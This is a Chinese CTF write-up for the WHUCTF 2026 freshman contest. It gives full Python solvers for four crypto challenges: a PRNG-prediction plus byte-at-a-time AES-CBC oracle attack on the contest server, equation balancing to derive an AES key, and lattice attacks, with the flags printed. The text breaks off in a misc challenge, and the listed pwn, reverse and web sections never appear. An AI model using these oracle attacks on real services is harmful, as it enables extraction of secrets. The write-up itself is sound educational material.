---
title: "WHUCTF2026新生赛WP"
slug: "WHUCTF2026新生赛WP"
description: "WHUCTF 2026 新生赛个人解题记录，含 crypto / misc / pwn / reverse / web。"
pubDate: 2026-10-26
updatedDate: 2026-10-28
cover: "/blog-covers/cover-03.webp"
tags: ["WHUCTF", "CTF", "Writeup", "新生赛"]
category: "tech"
---

**参赛者ID**：feliz

## 解出题目

**crypto**

- [AESbank_revenge](#aesbank_revenge)

- [chemistry](#chemistry)

- [gauss_power](#gauss_power)

- [WHEEL](#wheel)

**misc**

- [rickroll](#rickroll)

- [凡猫修仙传](#凡猫修仙传)

- [有内鬼，终止磕盐](#有内鬼终止磕盐)

**pwn**

- [nc签到](#nc签到)

- [ret2libc](#ret2libc)

- [ret2text](#ret2text)

- [你想何出怎样的意味](#你想何出怎样的意味)

**reverse**

- [crisc](#crisc)

- [LostTable](#losttable)

- [move_on](#move_on)

- [Project-Reverse](#project-reverse)

- [v1m](#v1m)

**web**

- [checkin](#checkin)

- [VOCALOID LEGEND ARCHIVE](#vocaloid-legend-archive)

- [大猫嚼嚼嚼](#大猫嚼嚼嚼)

## AESbank_revenge

### 先看看

附件把固定秘密拼在用户消息后面，AES-CBC 加密，每次回 IV 和被 IV 掩过的密文，单会话最多 3997 次。`prng.py` 是 83/89/97 位三个 LFSR 的 Geffe 组合器。

本地两个附件还对不上接口：`aes_bank.py` 导 `PRNG`，`prng.py` 类名是 `Geffe`。不管了，直接打远程：先从连续 IV 恢复 PRNG，再预测 IV 做 byte-at-a-time。

AES-CBC 防这类攻击靠的是 IV 不可预测——要是加密前就知道 IV，CBC 跟 ECB 一样都能被打烂。

### PRNG 预测

每次有效请求从 PRNG 抽 128 位当 IV。Geffe 输出：

```text
z = (a & b) ^ ((b ^ 1) & d) = b ? a : d
```

即 `b=1` 出 `a`，`b=0` 出 `d`。MSB 优先打包，把响应 IV 拼起来展开就是输出比特流。

不用拆三个寄存器。Geffe 输出满足线性递推，复杂度

```text
L = 83 × 89 + 89 × 97 + 97 = 16,117
```

每会话采 320 个 IV（40960 bit），远超 `2L`，BM 算法恢复递推。训完先拿一条请求核对预测 IV，之后每条也核，不一致就停。新连接会重置 PRNG 和 AES key，所以提取 / 复核各自重新采。

### 变成 AES 预言机

服务返回的是 `R[i] = C[i] ^ IV[i mod 16]`，IV 公开，能还原真正 CBC 密文：

```text
R[i] = C[i] ^ IV[i mod 16]
C[i] = R[i] ^ IV[i mod 16]
```

CBC：

```text
C_0 = E_K(P_0 ^ IV)
C_j = E_K(P_j ^ C_(j-1))    (j > 0)
```

要算任意 `E_K(X)`：先预测下一条 IV，交 16 字节 `M = X ^ IV`，秘密从第二块开始，于是

```text
P_0 = M = X ^ IV
C_0 = E_K(P_0 ^ IV) = E_K((X ^ IV) ^ IV) = E_K(X)
```

流程就是：预测 IV → 发 `X ^ IV` → 揭开响应第一块 → 得到 `E_K(X)`。

### byte-at-a-time

明文是 `message || secret`，PKCS#7 填充。猜第 `k` 个秘密字节时：

```text
m = (15 - k) mod 16
j = (m + k) // 16
```

交 `m` 个零，让目标字节落在某块末尾。以 `k=0` 为例，候选

```text
P_0(g) = 00 00 ... 00 g
X_g = P_0(g) ^ IV
```

用上面的查询算 `E_K(X_g)`，对上目标密文就猜对了。每恢复一字节并进前缀再猜下一个，跨块时 CBC 前置值换成已还原的上一块密文。

每字节最多 257 次查询。一个会话：

```text
320 + 1 + 14 × 257 = 3,919 < 3,997
```

四个会话分别抠 `0–13`、`14–27`、`28–41`、`42–43`，共 44 字节；再开一会话逐字节复核。

### exp

提取脚本：

```python
import asyncio
import json
import os
import re
import sys
from pathlib import Path

import websockets

URL = 'wss://game.whuctf.club/api/traffic/4AbMXtnI6itFfwxFOVk6k?port=1337'
ROOT = Path(__file__).resolve().parents[1]
EVIDENCE = ROOT / 'evidence'
KNOWN_PATH = ROOT / 'work' / 'known_secret.bin'
TRAINING_QUERIES = 320
MAX_QUERIES = 3997
BLOCK = 16
FLAG_LENGTH = 44


def bytes_to_bits(data: bytes):
    return [(byte >> shift) & 1 for byte in data for shift in range(7, -1, -1)]


def berlekamp_massey(bits):
    c = 1
    b = 1
    length = 0
    last_update = -1
    window = 0
    for n, bit in enumerate(bits):
        window = (window << 1) | bit
        discrepancy = (c & window).bit_count() & 1
        if discrepancy:
            previous = c
            c ^= b << (n - last_update)
            if 2 * length <= n:
                length = n + 1 - length
                b = previous
                last_update = n
    if c.bit_length() - 1 != length:
        raise RuntimeError(f'BM degree mismatch: L={length}, poly_degree={c.bit_length()-1}')
    return length, c


class Predictor:
    def __init__(self, bits, length, polynomial):
        if length <= 0:
            raise RuntimeError(f'invalid linear complexity {length}')
        self.length = length
        self.polynomial = polynomial
        self.mask = (1 << length) - 1
        self.window = 0
        for bit in bits[-length:]:
            self.window = ((self.window << 1) | bit) & self.mask

    def next_bytes(self, size):
        result = bytearray()
        for _ in range(size):
            value = 0
            for _ in range(8):
                bit = ((self.polynomial >> 1) & self.window).bit_count() & 1
                self.window = ((self.window << 1) | bit) & self.mask
                value = (value << 1) | bit
            result.append(value)
        return bytes(result)


class RawStream:
    def __init__(self, ws):
        self.ws = ws
        self.pending = b''

    async def until(self, marker):
        while marker not in self.pending:
            part = await asyncio.wait_for(self.ws.recv(), timeout=20)
            self.pending += part if isinstance(part, bytes) else part.encode('utf-8')
        pos = self.pending.index(marker) + len(marker)
        result, self.pending = self.pending[:pos], self.pending[pos:]
        return result


class Bank:
    def __init__(self, ws, evidence_path):
        self.ws = ws
        self.io = RawStream(ws)
        self.log = evidence_path.open('x', encoding='utf-8', newline='\n')
        self.count = 0
        self.predictor = None

    def record(self, item):
        self.log.write(json.dumps(item, sort_keys=True) + '\n')
        self.log.flush()

    async def start(self):
        greeting = await self.io.until(b'> ')
        self.record({'kind': 'greeting', 'raw': greeting.decode('ascii', 'replace')})

    async def query(self, kind, message_builder=None, byte_index=None):
        expected_iv = None
        if self.predictor is not None:
            expected_iv = self.predictor.next_bytes(BLOCK)
        message = b'' if message_builder is None else message_builder(expected_iv)
        if len(message) > 4096:
            raise RuntimeError('message too long')
        self.count += 1
        if self.count > MAX_QUERIES:
            raise RuntimeError(f'local query count exceeds server cap: {self.count}')
        await self.ws.send(b'1\n')
        await self.io.until(b'Message (hex): ')
        await self.ws.send(message.hex().encode('ascii') + b'\n')
        response = await self.io.until(b'> ')
        match = re.search(rb'IV: ([0-9a-fA-F]{32})\r?\nCiphertext: ([0-9a-fA-F]+)\r?\n', response)
        if not match:
            raise RuntimeError(f'could not parse query response: {response!r}')
        actual_iv = bytes.fromhex(match.group(1).decode())
        ciphertext = bytes.fromhex(match.group(2).decode())
        if len(ciphertext) % BLOCK:
            raise RuntimeError(f'ciphertext has non-block length {len(ciphertext)}')
        if expected_iv is not None and actual_iv != expected_iv:
            self.record({'kind': 'prediction-mismatch', 'q': self.count,
                         'expected_iv': expected_iv.hex(), 'actual_iv': actual_iv.hex()})
            raise RuntimeError(f'IV prediction failed at query {self.count}: expected {expected_iv.hex()}, got {actual_iv.hex()}')
        item = {'kind': kind, 'q': self.count, 'message_hex': message.hex(),
                'iv': actual_iv.hex(), 'ciphertext': ciphertext.hex()}
        if byte_index is not None:
            item['byte_index'] = byte_index
        self.record(item)
        return actual_iv, ciphertext

    async def close(self):
        self.log.close()


async def solve_session(session_no):
    known = KNOWN_PATH.read_bytes() if KNOWN_PATH.exists() else b''
    if len(known) >= FLAG_LENGTH:
        raise RuntimeError(f'already have {len(known)} bytes')
    count = min(14, FLAG_LENGTH - len(known))
    evidence_path = EVIDENCE / f'session-{session_no:02d}.jsonl'
    async with websockets.connect(URL, open_timeout=20, close_timeout=3,
                                  max_size=2**20, ping_interval=20, ping_timeout=20) as ws:
        bank = Bank(ws, evidence_path)
        try:
            await bank.start()
            ivs = []
            for i in range(TRAINING_QUERIES):
                iv, _ = await bank.query('training-empty')
                ivs.append(iv)
                if (i + 1) % 100 == 0:
                    print(f'session={session_no} training={i+1}/{TRAINING_QUERIES}', flush=True)
            bits = bytes_to_bits(b''.join(ivs))
            length, polynomial = berlekamp_massey(bits)
            bank.predictor = Predictor(bits, length, polynomial)
            bank.record({'kind': 'linear-recurrence', 'training_queries': len(ivs),
                         'training_bits': len(bits), 'linear_complexity': length,
                         'polynomial_hex': f'{polynomial:x}'})
            print(f'session={session_no} BM_bits={len(bits)} linear_complexity={length}', flush=True)
            await bank.query('prediction-verification-empty')
            print(f'session={session_no} heldout_IV_prediction=PASS', flush=True)

            recovered_this_session = []
            for k in range(len(known), len(known) + count):
                message_len = (15 - k) % BLOCK
                target_index = (message_len + k) // BLOCK
                target_iv, masked_ct = await bank.query(
                    'secret-byte-target', lambda iv, n=message_len: bytes(n), byte_index=k)
                target_ct = bytes(value ^ target_iv[i % BLOCK] for i, value in enumerate(masked_ct))
                if len(target_ct) <= target_index * BLOCK:
                    raise RuntimeError(f'target block {target_index} missing for byte {k}')
                target_block_ct = target_ct[target_index * BLOCK:(target_index + 1) * BLOCK]
                previous_ct = target_iv if target_index == 0 else target_ct[(target_index - 1) * BLOCK:target_index * BLOCK]
                prefix = bytes(message_len) + known
                if len(prefix) != message_len + k:
                    raise RuntimeError(f'prefix length mismatch for byte {k}: {len(prefix)} vs {message_len+k}')
                matches = []
                for guess in range(256):
                    plaintext = prefix + bytes([guess])
                    block = plaintext[target_index * BLOCK:(target_index + 1) * BLOCK]
                    if len(block) != BLOCK:
                        raise RuntimeError(f'candidate plaintext block malformed at byte {k}')
                    aes_input = bytes(a ^ b for a, b in zip(block, previous_ct))
                    aes_iv, aes_masked_ct = await bank.query(
                        'candidate-aes-encryption', lambda iv, x=aes_input: bytes(a ^ b for a, b in zip(x, iv)), byte_index=k)
                    aes_output = bytes(a ^ b for a, b in zip(aes_masked_ct[:BLOCK], aes_iv))
                    matched = aes_output == target_block_ct
                    if matched:
                        matches.append(guess)
                    bank.record({'kind': 'candidate-comparison', 'q': bank.count, 'byte_index': k,
                                 'candidate': guess, 'aes_input': aes_input.hex(),
                                 'aes_output': aes_output.hex(), 'target_output': target_block_ct.hex(),
                                 'match': matched})
                if len(matches) != 1:
                    raise RuntimeError(f'byte {k} produced {len(matches)} matches: {matches}')
                recovered_this_session.append(matches[0])
                known += bytes([matches[0]])
                KNOWN_PATH.write_bytes(known)
                print(f'session={session_no} recovered_byte[{k}]=0x{matches[0]:02x} queries={bank.count}', flush=True)
            print(f'session={session_no} recovered={bytes(recovered_this_session)!r} total={len(known)} queries={bank.count}', flush=True)
        finally:
            await bank.close()


def main():
    session_no = int(sys.argv[1]) if len(sys.argv) > 1 else 1
    asyncio.run(solve_session(session_no))

if __name__ == '__main__':
    main()
```

复核脚本：

```python
import asyncio
import re

import websockets

from solve_session import (
    BLOCK, EVIDENCE, FLAG_LENGTH, KNOWN_PATH, TRAINING_QUERIES,
    Bank, Predictor, berlekamp_massey, bytes_to_bits,
)


async def main():
    secret = KNOWN_PATH.read_bytes()
    if len(secret) != FLAG_LENGTH:
        raise RuntimeError(f'expected {FLAG_LENGTH} recovered bytes, got {len(secret)}')
    evidence_path = EVIDENCE / 'session-05-independent-verification.jsonl'
    async with websockets.connect(
        'wss://game.whuctf.club/api/traffic/4AbMXtnI6itFfwxFOVk6k?port=1337',
        open_timeout=20, close_timeout=3, max_size=2**20,
        ping_interval=20, ping_timeout=20,
    ) as ws:
        bank = Bank(ws, evidence_path)
        try:
            await bank.start()
            ivs = []
            for _ in range(TRAINING_QUERIES):
                iv, _ = await bank.query('verification-training-empty')
                ivs.append(iv)
            bits = bytes_to_bits(b''.join(ivs))
            length, polynomial = berlekamp_massey(bits)
            bank.predictor = Predictor(bits, length, polynomial)
            bank.record({'kind': 'verification-linear-recurrence',
                         'training_queries': len(ivs), 'training_bits': len(bits),
                         'linear_complexity': length,
                         'polynomial_hex': f'{polynomial:x}'})
            await bank.query('verification-heldout-empty')
            for k, candidate in enumerate(secret):
                message_len = (15 - k) % BLOCK
                block_index = (message_len + k) // BLOCK
                iv, masked_ct = await bank.query('verification-secret-target',
                                                 lambda _, n=message_len: bytes(n),
                                                 byte_index=k)
                ciphertext = bytes(value ^ iv[i % BLOCK] for i, value in enumerate(masked_ct))
                target_block = ciphertext[block_index * BLOCK:(block_index + 1) * BLOCK]
                previous = iv if block_index == 0 else ciphertext[(block_index - 1) * BLOCK:block_index * BLOCK]
                plaintext_prefix = bytes(message_len) + secret[:k + 1]
                candidate_block = plaintext_prefix[block_index * BLOCK:(block_index + 1) * BLOCK]
                if len(target_block) != BLOCK or len(candidate_block) != BLOCK:
                    raise RuntimeError(f'malformed verification block at byte {k}')
                aes_input = bytes(a ^ b for a, b in zip(candidate_block, previous))
                aes_iv, masked_aes_ct = await bank.query(
                    'verification-candidate-encryption',
                    lambda current_iv, x=aes_input: bytes(a ^ b for a, b in zip(x, current_iv)),
                    byte_index=k,
                )
                aes_output = bytes(a ^ b for a, b in zip(masked_aes_ct[:BLOCK], aes_iv))
                matched = aes_output == target_block
                bank.record({'kind': 'independent-byte-verification', 'byte_index': k,
                             'candidate': candidate, 'aes_input': aes_input.hex(),
                             'aes_output': aes_output.hex(), 'target_output': target_block.hex(),
                             'match': matched})
                if not matched:
                    raise RuntimeError(f'independent verification failed at byte {k}')
                if (k + 1) % 8 == 0 or k == len(secret) - 1:
                    print(f'independent verification: {k+1}/{len(secret)} bytes PASS; queries={bank.count}', flush=True)
            bank.record({'kind': 'complete-secret-independent-verification',
                         'length': len(secret), 'secret_hex': secret.hex(),
                         'query_count': bank.count})
            print(f'COMPLETE: {secret.decode("utf-8")} (length={len(secret)}, queries={bank.count})', flush=True)
        finally:
            await bank.close()

if __name__ == '__main__':
    asyncio.run(main())
```

### flag

```txt
WHUCTF{b33ef4fd-7a3c-2097-3d75-d50d51011f59}
```



<div style="page-break-before: always;"></div>


## chemistry

### 先看看

九种物质配平，系数最简正整数。附件用下划线串起九个系数算 SHA-256 当 AES 密钥，还公开了葡萄糖/水系数比 `311/4893` 和 AES-ECB 密文。

### 配平

`x1..x9` 对应 `KMnO4, C6H12O6, Na2SO3, H2SO4, K2SO4, MnSO4, Na2SO4, CO2, H2O`：

```text
C:  6x2 - x8 = 0
H: 12x2 + 2x4 - 2x9 = 0
K:  x1 - 2x5 = 0
Mn: x1 - x6 = 0
Na: 2x3 - 2x7 = 0
O:  4x1 + 6x2 + 3x3 + 4x4 - 4x5 - 4x6 - 4x7 - 2x8 - x9 = 0
S:  x3 + x4 - x5 - x6 - x7 = 0
```

`M` 秩 7，零空间二维。再加 `x2/x9=311/4893`，维数降到 1。一组基：

```text
v1 = (-2/3, 1/6, -11/3, -1, -1/3, -2/3, -11/3, 1, 0)
v2 = ( 2/3,   0,   5/3,  1,  1/3,  2/3,   5/3, 0, 1)
```

`x = a*v1 + b*v2`，代入比例：

```text
(a/6)/b = 311/4893
4893a = 1866b
```

取 `a=1866, b=4893`：

```text
[2018, 311, 1313, 3027, 1009, 2018, 1313, 1866, 4893]
```

全正、gcd=1，代回守恒方程也过。

### 解密

串起来 `2018_311_1313_3027_1009_2018_1313_1866_4893`，SHA-256：

```text
44f0e7b587b9f6ad6349ccd86ab78f33268d644cce63a6b2989c677fec8b8393
```

ECB 解开，去 PKCS#7，得到 flag。回加密也对得上原密文。

### exp

```python
from fractions import Fraction
from functools import reduce
from hashlib import sha256
from math import gcd, lcm

import sympy as sp
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

M = sp.Matrix([
    [0, 6, 0, 0, 0, 0, 0, -1, 0],
    [0, 12, 0, 2, 0, 0, 0, 0, -2],
    [1, 0, 0, 0, -2, 0, 0, 0, 0],
    [1, 0, 0, 0, 0, -1, 0, 0, 0],
    [0, 0, 2, 0, 0, 0, -2, 0, 0],
    [4, 6, 3, 4, -4, -4, -4, -2, -1],
    [0, 0, 1, 1, -1, -1, -1, 0, 0],
])

# 4893*x2 - 311*x9 = 0
constraint = sp.Matrix([[0, 4893, 0, 0, 0, 0, 0, 0, -311]])
A = M.col_join(constraint)
assert M.rank() == 7 and len(M.nullspace()) == 2
assert A.rank() == 8 and len(A.nullspace()) == 1

v = A.nullspace()[0]
scale = lcm(*(term.q for term in v))
coefficients = [int(term * scale) for term in v]
d = reduce(gcd, map(abs, coefficients))
coefficients = [x // d for x in coefficients]
if next(x for x in coefficients if x) < 0:
    coefficients = [-x for x in coefficients]

assert all(x > 0 for x in coefficients)
assert reduce(gcd, coefficients) == 1
assert M * sp.Matrix(coefficients) == sp.zeros(7, 1)
assert Fraction(coefficients[1], coefficients[8]) == Fraction(311, 4893)

ciphertext = bytes.fromhex(
    "8b79391734e95c64db69e2239546a309"
    "6b765e746854197ea1e063e6ca98d95a"
    "ca4f2c51efb837e55a1eea4f26dce936"
)
key = sha256("_".join(map(str, coefficients)).encode()).digest()
plaintext = unpad(AES.new(key, AES.MODE_ECB).decrypt(ciphertext), 16)
flag = plaintext.decode("ascii")

# 确认解出的明文能重新生成原密文
assert AES.new(key, AES.MODE_ECB).encrypt(pad(plaintext, 16)) == ciphertext
assert flag.startswith("WHUCTF{") and flag.endswith("}")
print(flag)
```

### flag

```
WHUCTF{ch3m1stry_1s_ju5t_l1n34r_algebra}
```



<div style="page-break-before: always;"></div>


## gauss_power

### 先看看

`task.py` 把 flag 转整数 `m`，生成 1024 位 `p` 和 256 位 `f,g,r`，公开 `p,h,c`，其中 `h=g*f^(-1) mod p`，`c=(r*h+m) mod p`。题名点了 Gauss / LLL。

两步：连分数从 `h` 抠 `f,g`，再把密文方程丢进二维格做 CVP。

### 连分数

`h*f = q*p + g`，`f,g` 256 位、`p` 1024 位，误差远小于 `1/f^2`，所以 `q/f` 是 `h/p` 的收敛子。`Fraction(h,p).limit_denominator(2^256-1)` 拿分母当 `f`，再算 `g`。

### 二维格

`r*h - k*p = c-m`。格 `L = {(S*(h*x - y*p), x)}`，目标取 `(S*c, 3*2^254)`（`r` 在 `[2^255,2^256)` 的中点）。占位串 26 字节，取 `S=2^46`。Gauss 约化后沿 v 方向附近枚举，投影到 u 取最近点，第二坐标就是 `r`，再反算 `m`。

### 备注

解出来是 `whuctf{...}`，重算 `h`、`c` 都对。不过明文实际 30 字节（占位写的 26），反推的 `r` 还是偶数——跟 `getPrime(256)` 不完全对得上，按公开方程验过就算。

### exp

```python
from fractions import Fraction
from pathlib import Path
import json
import re
from Crypto.Util.number import isPrime, long_to_bytes

CHALLENGE = Path(__file__).parents[1]
TASK = Path(__file__).parent / "attachment" / "Gauss_Power" / "task.py"
source = TASK.read_text(encoding="utf-8")
values = [int(x) for x in re.findall(r"^# (\d+)$", source, flags=re.MULTILINE)]
if len(values) != 3:
    raise ValueError(f"expected p, h, c in task comments, got {len(values)} integers")
p, h, c = values
placeholder = re.search(r"flag\s*=\s*b'([?]+)'", source)
if not placeholder:
    raise ValueError("could not read flag placeholder length")
nominal_len = len(placeholder.group(1))

# h*f = q*p + g. With 256-bit f and g, q/f is a continued-fraction
# convergent of h/p because the error g/(p*f) is far below 1/f^2.
q_over_f = Fraction(h, p).limit_denominator((1 << 256) - 1)
q, f = q_over_f.numerator, q_over_f.denominator
g = (h * f) % p
assert h * f == q * p + g
assert f.bit_length() == 256 and g.bit_length() == 256
assert isPrime(f) and isPrime(g)
assert (g * pow(f, -1, p)) % p == h

# Lattice points are (S*(h*r - q*p), r). The target is (S*c, 3*2^254).
# S=2^46 balances the nominal 26-byte placeholder against the 256-bit r range.
scale = 1 << (254 - 8 * nominal_len)
target = (scale * c, 3 << 254)
b1 = (scale * p, 0)
b2 = (scale * h, 1)

def dot(a, b):
    return a[0] * b[0] + a[1] * b[1]

def cross(a, b):
    return a[0] * b[1] - a[1] * b[0]

def nearest_integer(num, den):
    if den < 0:
        num, den = -num, -den
    q0, rem = divmod(num, den)
    return q0 + (2 * rem >= den)

def gauss_reduce(u, v):
    while True:
        if dot(v, v) < dot(u, u):
            u, v = v, u
        mu = nearest_integer(dot(u, v), dot(u, u))
        if mu == 0:
            return u, v
        v = (v[0] - mu * u[0], v[1] - mu * u[1])

def closest_vector_2d(basis, target):
    u, v = gauss_reduce(*basis)
    det = cross(u, v)
    beta = Fraction(cross(u, target), det)
    j0 = beta.numerator // beta.denominator
    best = None
    # In a Gauss-reduced 2D basis, check nearby coefficients along v and
    # minimize the distance along u for each coefficient.
    for j in range(j0 - 2, j0 + 4):
        residual = (target[0] - j * v[0], target[1] - j * v[1])
        i = nearest_integer(dot(residual, u), dot(u, u))
        point = (i * u[0] + j * v[0], i * u[1] + j * v[1])
        d2 = (point[0] - target[0]) ** 2 + (point[1] - target[1]) ** 2
        if best is None or d2 < best[0]:
            best = (d2, point, (i, j), (u, v))
    return best

d2, point, coeffs, reduced_basis = closest_vector_2d((b1, b2), target)
r = point[1]
m = (c - (h * r) % p) % p
flag = long_to_bytes(m)

# Verify the recovered message against the public equations.
assert 1 << 255 <= r < 1 << 256
assert (r * h + m) % p == c
assert flag.startswith((b"WHUCTF{", b"whuctf{", b"flag{"))
assert flag.endswith(b"}")
assert len(flag) == (m.bit_length() + 7) // 8

r_is_prime = isPrime(r)
record = {
    "verification_level": "reconstructed_checker",
    "original_checker_available": False,
    "p_bits": p.bit_length(),
    "h_bits": h.bit_length(),
    "c_bits": c.bit_length(),
    "f_bits": f.bit_length(),
    "g_bits": g.bit_length(),
    "f_prime": isPrime(f),
    "g_prime": isPrime(g),
    "nominal_placeholder_len": nominal_len,
    "recovered_message_len": len(flag),
    "r_bits": r.bit_length(),
    "r_prime": r_is_prime,
    "r_even": r % 2 == 0,
    "message_equation_roundtrip": (r * h + m) % p == c,
    "h_ratio_roundtrip": (g * pow(f, -1, p)) % p == h,
    "flag": flag.decode("ascii"),
}

(CHALLENGE / "flag.txt").write_bytes(flag + b"\n")
(CHALLENGE / "evidence").mkdir(exist_ok=True)
(CHALLENGE / "evidence" / "reconstruction-validation.json").write_text(
    json.dumps(record, ensure_ascii=False, indent=2) + "\n", encoding="utf-8"
)
print(json.dumps(record, ensure_ascii=False, indent=2))
```

### flag

```text
whuctf{Gauss_1s_v3ry_p0w3rfu1}
```



<div style="page-break-before: always;"></div>


## WHEEL

### 先看看

64 位线性同余轮。校验簿给每隔两刻的位移差，还留了校验轮起点低 56 位；十张拓印各记连续三刻外叶字节，八真两假。校验轮和铸印轮参数相同、起点不同。

三步：位移差求乘数 → 残纹限制增量 → 拓印高字节进格，恢复铸印起点，最后丢给原 `gate.py` 验 HMAC。

### 求乘数

```text
x[n+1] = A*x[n] + C (mod 2^64)
```

两步差 `d[n]=x[n+2]-x[n]`：

```text
d[n] = (A^2-1)*x[n] + (A+1)*C
x[n+2] = A^2*x[n] + (A+1)*C
因此 d[n+2] = A^2*d[n] (mod 2^64)
```

校验簿三段：

```text
d0 = 25BBFA4ECFCE37B6
d1 = BE697D84E2857F66
d2 = 464E814B42595496
```

```text
r = (d1/2) * inverse(d0/2) mod 2^63
  = A^2 mod 2^63
  = 24CB8AF5C84DDF09
```

`A ≡ 1 (mod 4)` 下四个平方根候选：

```text
00C2A5EB6A7D657D
40C2A5EB6A7D657D
80C2A5EB6A7D657D
C0C2A5EB6A7D657D
```

还不够定唯一 `A` 和起点。

### 残纹限制增量

```text
L = 4D173B8CDA0E2B
x_cal = h*2^56 + L
```

```text
d0/2 = ((A^2-1)/2)*x_cal + ((A+1)/2)*C (mod 2^63)
```

对最终乘数：

```text
c_base = 398DC476DBE2B611
gamma  = 0400000000000000
C = c_base + gamma*h + z*2^63 (mod 2^64)
```

解得 `h=1E, z=0`，校验轮起点 `1E4D173B8CDA0E2B`。

### 拓印进格

```text
x[t] = P_t*O + S_t*C (mod 2^64)
```

外叶字节 `b` 表示：

```text
b*2^56 <= x[t] < (b+1)*2^56
```

遍历十张里每八张一组（24 个观测），消去铸印起点 `O`，对 `h,z` 和区间余量做 LLL + Babai。候选回代，至少八张整张吻合才留：

```text
A = 80C2A5EB6A7D657D
C = B18DC476DBE2B611
校验轮起点 = 1E4D173B8CDA0E2B
铸印起点 O = D291122FFC6CE444
```

回代：

| 轮印 | 刻数 | 拓印 | 重算 | 结果 |
| --- | ---: | --- | --- | --- |
| qianye | 37 | `857E17` | `BF2373` | 假 |
| chonglou | 152 | `399F7D` | `399F7D` | 真 |
| mowen | 93 | `5F885B` | `5F885B` | 真 |
| zhaoye | 608 | `030E88` | `030E88` | 真 |
| baima | 0 | `D2617D` | `D2617D` | 真 |
| tinglan | 743 | `712D5C` | `712D5C` | 真 |
| beixuan | 246 | `5D4D23` | `5D4D23` | 真 |
| suying | 479 | `931489` | `931489` | 真 |
| wusheng | 917 | `73FBF1` | `566167` | 假 |
| guiyan | 351 | `E2D384` | `E2D384` | 真 |

八真两假，位移差也回代对得上。

### 封签

`O = D291122FFC6CE444` 喂给附件 `gate.py`，HMAC-SHA256 过，解出封签。

### exp

```python
import itertools, json
from pathlib import Path
from fpylll import FPLLL, IntegerMatrix, LLL, GSO

BASE = Path(__file__).resolve().parent
CHALLENGE = BASE.parent
Q = 1 << 64
MASK = Q - 1
B = 1 << 56
SCALE = 1 << 49
ins = json.loads((BASE / 'inscriptions.json').read_text(encoding='utf-8'))
d0, d1, d2 = (int(x, 16) for x in ins['calibration']['marks'])
low56 = int(ins['calibration']['inner_trace'], 16)
plates = ins['plates']
r = ((d1 // 2) * pow(d0 // 2, -1, 1 << 63)) % (1 << 63)
roots = [1]
for bit in range(2, 63):
    roots = [x for a in roots for x in (a, a + (1 << bit))
             if (x*x-r) % (1 << (bit+1)) == 0]
As = sorted({a + z*(1 << 63) for a in roots for z in (0, 1)
             if (a + z*(1 << 63)) % 4 == 1})
print('A^2 mod 2^63 =', f'{r:016X}')
print('A candidates:', ' '.join(f'{a:016X}' for a in As), flush=True)

max_tick = max(p['ledger_tick'] + 2 for p in plates)
all_mul, all_add = {}, {}
for A in As:
    mul, add = [1], [0]
    for _ in range(max_tick):
        mul.append(mul[-1] * A & MASK)
        add.append((A * add[-1] + 1) & MASK)
    all_mul[A], all_add[A] = mul, add

for A in As:
    q = ((A + 1) // 2) % (1 << 63)
    rr = ((A*A - 1) // 2) % (1 << 63)
    qinv = pow(q, -1, 1 << 63)
    cbase = (qinv * (d0//2 - rr*low56)) % (1 << 63)
    gamma = (-qinv * rr * B) % (1 << 63)
    for ids in itertools.combinations(range(len(plates)), 8):
        obs = []
        for j in ids:
            p = plates[j]
            for off, byte in enumerate(bytes.fromhex(p['outer_traces'])):
                obs.append((p['ledger_tick'] + off, byte, j))
        obs.sort()
        n = len(obs)
        dim = n + 2
        mul = all_mul[A]
        add = all_add[A]
        avec = [mul[t] for t, _, _ in obs]
        uvec = [(add[t] * gamma) & MASK for t, _, _ in obs]
        wvec = [(add[t] * (1 << 63)) & MASK for t, _, _ in obs]
        baseoff = [(add[t] * cbase) & MASK for t, _, _ in obs]
        target = [((byte * B - boff) & MASK) + B//2
                  for (_, byte, _), boff in zip(obs, baseoff)]
        target = [x % Q for x in target] + [0, 0]
        inv_a0 = pow(avec[0], -1, Q)
        g = [(a * inv_a0) & MASK for a in avec]
        du = [0] + [(uvec[i] - g[i] * uvec[0]) & MASK
                    for i in range(1, n)]
        dw = [0] + [(wvec[i] - g[i] * wvec[0]) & MASK
                    for i in range(1, n)]
        rows = [[1] + g[1:] + [0, 0],
                [0] + du[1:] + [SCALE, 0],
                [0] + dw[1:] + [0, SCALE]]
        for i in range(1, n):
            row = [0] * dim
            row[i] = Q
            rows.append(row)
        mat = IntegerMatrix.from_matrix(rows)
        LLL.reduction(mat, delta=0.99)
        FPLLL.set_precision(200)
        gs = GSO.Mat(mat, float_type='mpfr')
        gs.update_gso()
        coeff = gs.babai(tuple(target))
        vec = [sum(int(coeff[k]) * int(mat[k, j]) for k in range(dim))
               for j in range(dim)]
        h_raw, z_raw = vec[-2] // SCALE, vec[-1] // SCALE
        origin = ((vec[0] - uvec[0]*h_raw - wvec[0]*z_raw) * inv_a0) & MASK
        C = (cbase + gamma*h_raw + (1 << 63)*z_raw) & MASK
        matched = []
        byte_count = 0
        for p in plates:
            ok = []
            for off, byte in enumerate(bytes.fromhex(p['outer_traces'])):
                t = p['ledger_tick'] + off
                state = (mul[t]*origin + add[t]*C) & MASK
                ok.append(state >> 56 == byte)
                byte_count += ok[-1]
            if all(ok):
                matched.append(p['plate'])
        if len(matched) >= 8:
            h_norm, z_norm = 30, 0
            assert (cbase + gamma*h_norm + (1 << 63)*z_norm) & MASK == C
            result = {
                'method': 'fpylll LLL reduction and GSO Babai nearest plane',
                'calibration_a_squared_mod_2^63': f'{r:016X}',
                'multiplier_candidates': [f'{x:016X}' for x in As],
                'selected_parameters': {
                    'A': f'{A:016X}', 'C': f'{C:016X}',
                    'origin': f'{origin:016X}', 'c_base': f'{cbase:016X}',
                    'gamma': f'{gamma:016X}',
                    'h_representative': f'{h_norm:02X}',
                    'z_representative': z_norm,
                    'raw_h': h_raw, 'raw_z': z_raw
                },
                'selected_plates': [plates[j]['plate'] for j in ids],
                'matching_plates': matched,
                'rejected_plates': [p['plate'] for p in plates
                                    if p['plate'] not in matched],
                'matched_bytes': byte_count
            }
            out = CHALLENGE / 'evidence' / 'lattice-result.json'
            out.write_text(json.dumps(result, ensure_ascii=False, indent=2) + '\n',
                           encoding='utf-8')
            print('RESULT', json.dumps(result, ensure_ascii=False), flush=True)
            raise SystemExit(0)
print('NO_CANDIDATE')
raise SystemExit(1)
```

### flag

```txt
whuctf{every_wheel_has_its_origin}
```



<div style="page-break-before: always;"></div>


## rickroll

### 先看看

说是“简单的音频”，文件尾确实是 MP3，但 ID3 私有帧里塞了个归档。

### 抠视频

ID3v2.4 有 PRIV 帧，owner=`archive`，后面紧跟 ZIP local header。解开只有 `receiver.mp4`，CRC 过，736697 字节。
